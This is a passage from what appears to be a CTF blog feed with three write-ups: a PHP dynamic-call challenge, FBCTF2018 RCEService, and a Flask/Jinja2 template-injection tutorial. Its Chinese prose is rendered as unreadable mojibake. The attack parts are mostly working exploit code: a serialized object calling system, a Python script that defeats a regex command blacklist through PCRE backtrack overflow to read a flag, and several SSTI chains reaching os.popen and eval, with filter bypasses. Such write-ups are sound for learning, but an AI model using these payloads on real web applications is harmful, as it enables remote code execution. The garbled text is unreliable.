<p>äºæ˜¯æ„é€ ï¼š</p>
<p><img src="image-20201028192957104.png" alt="image-20201028192957104"></p>
<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘åˆå¡ä½äº†ï¼Œçœ‹ä¼¼å¥½åƒæ˜¯ååºåˆ—åŒ–ï¼Œåˆå¥½åƒä¸æ˜¯å•Šï¼Ÿæ‰¾ä¸åˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œä¸€æ—¶é—´åˆåƒµä½äº†ï¼Œè¿‡äº†ä¸€ä¼šå„¿çœ‹äº†å¤§ä½¬çš„WPæ‰æ„è¯†åˆ°æ˜¯è‡ªå·±æ€è·¯è¿˜ä¸å¤Ÿçµæ´»ï¼Œè¿™é“é¢˜æ²¡æœ‰unserializeï¼Œä½†æ˜¯å¯ä»¥åŠ¨è°ƒå‡½æ•°ï¼Œå®¡è®¡ä»£ç ä¸­çš„Testç±»ï¼Œå…¶å®ä»–æ˜¯æœ‰gettimeçš„ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªåŠ¨è°ƒå‡½æ•°ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡®</p>
<h1 id="2-æ„é€ payload"><a href="#2-æ„é€ payload" class="headerlink" title="2.æ„é€ payload"></a>2.æ„é€ payload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __destruct() &#123;</span></span><br><span class="line"><span class="comment">//        if ($this-&gt;func != &quot;&quot;) &#123;</span></span><br><span class="line"><span class="comment">//            echo gettime($this-&gt;func, $this-&gt;p);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> (serialize($test));</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°†è¿™ä¸€æ®µå¸¦å…¥åˆ°é¢˜ç›®å½“ä¸­ï¼Œæœ€ç»ˆåœ¨tmpç›®å½•ä¸‹æ‰¾åˆ°</p>
<p><img src="image-20201028192936143.png" alt="image-20201028192936143"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>FBCTF2018RCEService</title>
    <url>/2020/11/17/FBCTF2018RCEService/</url>
    <content><![CDATA[<p>è¦ç›²è¯•è¯•å‡ºæ¥ã€‚ã€‚ã€‚å¤§ä½¬è¯´æ˜¯æœ‰æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æ³¨æ„è¿™é‡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œå‘½ä»¤çš„è¯å¿…é¡»é€šè¿‡/bin/catæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæœ¬äººä¸æ˜¯å¾ˆèƒ½æ˜ç™½åŸå› ã€‚ã€‚ï¼‰</p>
<p>æ­£åˆ™ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html</span><br></pre></td></tr></table></figure>

<p>é˜…è¯»Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼Œå¤§è‡´æ„æ€æ˜¯ï¼ŒPHPçš„æ­£åˆ™å¹¶ä¸æ˜¯é€šè¿‡æ ¹æ®æ­£åˆ™çš„åŒ¹é…æ¥å†³å®šä¸‹ä¸€æ­¥çš„ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œæ­£åˆ™ä¾¿ä¼šæ— é™çš„å‘ååŒ¹é…ï¼Œç›´åˆ°æœ«å°¾ä¹‹åï¼Œå¦‚æœæ­£åˆ™æ²¡æœ‰èƒ½å¤ŸæˆåŠŸåŒ¹é…ç»“å°¾ï¼Œå°±ä¼šå¾€å›å›æº¯ï¼Œæ¥æŸ¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„æƒ…å†µ</p>
<p><img src="FBCTF2018RCEService/image-20201117154441800.png" alt="image-20201117154441800"></p>
<p>ç±»ä¼¼Pç‰›å¤§ä½¬çš„ä¾‹å­ï¼Œå¦‚æœæŒ‰ç…§æˆ‘ä»¬çš„æ€è·¯çš„è¯ï¼Œå½“åŒ¹é…åˆ° ;çš„æ—¶å€™ï¼Œå·²ç»åŒ¹é…æˆåŠŸï¼Œæ‰€ä»¥å°±åº”è¯¥åœä¸‹æ¥äº†ï¼Œä½†æ˜¯ç”±äº.*å¯ä»¥åŒ¹é…ä»»æ„ï¼Œæ•…æˆ‘ä»¬ä¼šä¸€ç›´åŒ¹é…åˆ°æœ€åä¸€æ­¥ï¼Œä½†æ­¤æ—¶æ­£åˆ™æ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œå°±ä¼šå¾€å‰æ¨ï¼Œç›´åˆ°æ­£åˆ™åŒ¹é…æˆåŠŸã€‚</p>
<p>åˆå› ä¸ºPç‰›å¸ˆå‚…è¯´çš„ï¼Œåªè¦å›æº¯100000æ­¤å°±ä¼šå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€ä¸€ä¸²è¶…çº§é•¿çš„å­—ç¬¦ä¸²å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">params = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&quot;cmd&quot;</span>:params&#125;</span><br><span class="line">url = <span class="string">&quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œä¸€å®šè¦å‘é€poståŒ…ï¼ŒgetåŒ…æ— æ³•æ¥å—è¿™ä¹ˆé•¿çš„å‚æ•°ï¼Œä¼ è¿‡å»å°±å¯ä»¥å¾—åˆ°flagäº†</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>FlaskSSti</title>
    <url>/2020/10/27/FlaskSSti/</url>
    <content><![CDATA[<p>ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš</p>
<a id="more"></a>

<h1 id="1-hackbar-è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„"><a href="#1-hackbar-è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„" class="headerlink" title="1.hackbar è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„"></a>1.hackbar è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„</h1><p>ç¬¬ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯æ­å»ºæˆ‘ä»¬çš„ç¯å¢ƒï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27;</span> % (<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ç§å°±æ˜¯æœ€åŸºæœ¬çš„flaskï¼Œåœ¨flaskå½“ä¸­jinjiaçš„æ¨¡æ¿ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªèŠ±æ‹¬å·å°±å¯ä»¥å…è®¸ä¸€äº›åŸºæœ¬çš„è¿ç®— ç”¨äºæ‰§è¡Œifï¼Œforå¾ªç¯ç­‰ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ä¸ªæœ€åŸºæœ¬çš„payloadçš„æ„é€ æ–¹å¼æ˜¯è¯¥æ€ä¹ˆè§¦å‘å‘¢ï¼Ÿç¬¬ä¸€æ­¥ï¼Œä»configç±»è§¦å‘ï¼Œå› ä¸ºFlaské‡Œé¢è‡ªå¸¦</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026173228975.png" alt="image-20201026173228975"></p>
<p>é€šè¿‡è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„flaskçš„config~ï¼Œè€Œè¿™ä¸€çš„æ„ä¹‰å¥½åƒä¸æ˜¯å¾ˆå¤§ï¼Ÿæˆ‘ä»¬å¾—ä¸åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªä½œä¸ºè·³æ¿ï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__class__.__init__</span><br></pre></td></tr></table></figure>

<p>__classæ–¹æ³•å±æ€§çš„æ—¶å€™ä¼šåªæƒ³è¯¥å®ä¾‹å¯¹åº”çš„ç±»ï¼Œæ­¤æ—¶configçš„ç±»æ˜¯Config,ç„¶åå¯ä»¥å†å»è°ƒç”¨å…¶å®ƒç±»å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬å®¡è®¡äº†æºç ï¼Œå°±å¯ä»¥çŸ¥é“æˆ‘ä»¬æ­¤æ—¶çš„Configç±»ä½äºconfig.py80å¤šè¡Œï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ__init__ä¹‹åï¼Œä¾¿å¯ä»¥åœ¨ä¸‹é¢çš„101è¡Œæ‰¾åˆ°è¿™ä¹ˆä¸€è¡Œä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rv = os.environ.get(variable_name)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„configç±»å½“ä¸­å«æœ‰osåº“çš„æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨æ˜¯ä¸è¡Œçš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡globalså‡½æ•°å…ˆè·å–åˆ°å®ƒï¼Œäºæ˜¯å¾—åˆ°ï¼š</p>
<p><strong>globals()</strong> å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡,åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æˆ‘ä»¬æ‹¼æ¥å¾—åˆ°å¦‚ä¸‹çš„payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config.__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°ï¼š</p>
<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026175828323.png" alt="image-20201026175828323"></p>
<p>æˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼æ¥è·å–osåº“ï¼Œåˆ©ç”¨__dictè¿™ä¸ªæ–¹æ³•æ¥æŸ¥çœ‹osåº“å“ªäº›å¯ä»¥ç»™æˆ‘ä»¬è¿›è¡Œä½¿ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°systemï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨è¯¥æ–¹æ³•å´æ— æ³•å¾—åˆ°å›æ˜¾ï¼Œè¯¥æ–¹æ³•åªä¸è¿‡æ˜¯æˆåŠŸçš„æ—¶å€™è¿”å›1ï¼Œå¤±è´¥äº†åˆ™æ˜¯è¿”å›0</p>
<p>æ‰§è¡Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°1æˆ–è€…0å¯¹äºæˆ‘ä»¬æ¥è¯´æ„ä¹‰ä¸å¤§ï¼Œå½“ç„¶è¿™æ ·ä¹Ÿå¯ä»¥è¿›è¡Œç›²æ³¨ã€ï¼Œè€Œpopenåˆ™å¯ä»¥è¿”å›æ–‡ä»¶å¯¹è±¡</p>
<p><strong>os.popen</strong> </p>
<p>ã€€ã€€è¯¥æ–¹æ³•ä¸ä½†æ‰§è¡Œå‘½ä»¤è¿˜è¿”å›æ‰§è¡Œåçš„ä¿¡æ¯å¯¹è±¡ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªç®¡é“æ–‡ä»¶å°†ç»“æœè¿”å›ã€‚</p>
<p>ã€€ã€€output = os.popen(â€˜cat /proc/cpuinfoâ€™)</p>
<p>ã€€ã€€print output.read()</p>
<p>äºæ˜¯æˆ‘ä»¬æ„é€ æœ€ç»ˆçš„payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;dir()&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-configä»¥å¤–çš„æ€è·¯"><a href="#1-2-configä»¥å¤–çš„æ€è·¯" class="headerlink" title="1.2 configä»¥å¤–çš„æ€è·¯"></a>1.2 configä»¥å¤–çš„æ€è·¯</h2><p>å…¶ä»–çš„ä¸€äº›æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬çš„configè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡()å’Œâ€™â€™åˆ†åˆ«è·å–åˆ°tupleå’Œstrçš„åˆå§‹åŒ–~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__name__  <span class="comment">#å¾—åˆ°str</span></span><br><span class="line">()_.__class__.__name__ <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å¼•å…¥baseå’Œmroçš„é­”æœ¯æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bases : ç±»çš„åŸºç±»çš„å…ƒç»„ï¼Œé¡ºåºä¸ºå®ƒä»¬åœ¨åŸºç±»åˆ—è¡¨ä¸­å‡ºç°çš„é¡ºåºï¼ˆåŸºç±»å°±æ˜¯Objectç±»~ï¼‰</span><br><span class="line">mro :ç±»çš„çˆ¶ç±»ï¼Œä»çˆ¶ç±»ç½‘ä¸Šæ‰¾ï¼Œæœ€ç»ˆä¼šæ‰¾åˆ°åŸºç±»ï¼Œæ‰€ä»¥mro[<span class="number">-1</span>]ç­‰ä»·äº__bases__</span><br></pre></td></tr></table></figure>

<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026184448939.png" alt="image-20201026184448939"></p>
<p>è¿™æ—¶å€™æˆ‘ä»¬å°±æƒ³åˆ°çš„ï¼Œæˆ‘ä»¬æ—¢ç„¶å¾—åˆ°äº†åŸºç±»ï¼Œæ˜¯ä¸æ˜¯å°±æƒ³è¦æ‰€æœ‰çš„å­ç±»äº†å‘¢ï¼Ÿæ¯•ç«Ÿå­ç±»çš„å†…å®¹æˆ‘ä»¬æ›´åŠ æ„Ÿå…´è¶£ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°osåº“å¯¹å§ã€‚è€Œpythonæ­£å¥½æ‹¥æœ‰è¿™ä¸ªé­”æœ¯æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__ <span class="comment">#è·å–æ‰€æœ‰çš„å­ç±»æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæ…¢æ…¢å»å¯»æ‰¾å³å¯ï¼Œè¯¥æ–‡ç« ä¸­æœ‰ï¼Œåœ¨catch_warnningsæ¨¡å—ä¸‹å«æœ‰builtinsï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå»æ‰¾evalï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="1-3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š"><a href="#1-3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š" class="headerlink" title="1.3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š"></a>1.3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼š</h2><p>æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è¦ä¹ˆå»æ‰¾builtinså‡½æ•°ä¸‹çš„evalï¼Œè¦ä¹ˆå»æ‰¾osã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C</span><br></pre></td></tr></table></figure>



<h1 id="2-è°ˆè°ˆè¿‡æ»¤"><a href="#2-è°ˆè°ˆè¿‡æ»¤" class="headerlink" title="2.è°ˆè°ˆè¿‡æ»¤"></a>2.è°ˆè°ˆè¿‡æ»¤</h1><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šé‡è§å„ç§å„æ ·çš„è¿‡æ»¤ï¼Œæ¯”å¦‚æˆ‘ä»¬é‡è§å¯¹configçš„è¿‡æ»¤ï¼Œä»¥åŠosè¿‡æ»¤å•Šç­‰ç­‰</p>
<h2 id="2-1-è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ"><a href="#2-1-è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ" class="headerlink" title="2.1 è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ"></a>2.1 è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µ</h2><p>åœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿä¸éœ€æ…Œï¼Œå¦‚æœåªæ˜¯å¯¹ä¸­æ‹¬å·ä¸­å¯èƒ½ç”¨åˆ°çš„å†…å®¹è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ‹¼æ¥ç»•è¿‡ï¼š</p>
<p>æ¯”å¦‚æˆ‘ä»¬ä¹‹å‰çš„payloadä¿®æ”¹æˆï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-è¿‡æ»¤äº†ä¸­æ‹¬å·"><a href="#2-2-è¿‡æ»¤äº†ä¸­æ‹¬å·" class="headerlink" title="2.2 è¿‡æ»¤äº†ä¸­æ‹¬å·"></a>2.2 è¿‡æ»¤äº†ä¸­æ‹¬å·</h2><p>è¿™æ ·çš„è¯,å¯ä»¥ç”¨getitemæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç­‰ä»·äºä¸€ä¸ªè¿­ä»£å™¨çš„é€‰æ‹©ï¼Œå¼€å‘è€…çš„åŸæ„æ˜¯è®©äººä»¬å¯ä»¥ç”¨è¿™ä¸ªè¿­ä»£å¯¹è±¡,è¿™ç¯‡æ–‡ç« è®²çš„ä¸é”™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775</span><br></pre></td></tr></table></figure>

<p>Pythonçš„é­”æ³•æ–¹æ³•<code>__getitem__</code> å¯ä»¥è®©å¯¹è±¡å®ç°è¿­ä»£åŠŸèƒ½ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨<code>for...in...</code> æ¥è¿­ä»£è¯¥å¯¹è±¡äº†ï¼ŒåŒæ—¶ä¹Ÿå…è®¸æˆ‘ä»¬åˆ©ç”¨gettiemæ¥ç›´æ¥é€‰æ‹©å†…å®¹,æ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir()&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨requestèµ·æ­¥</p>
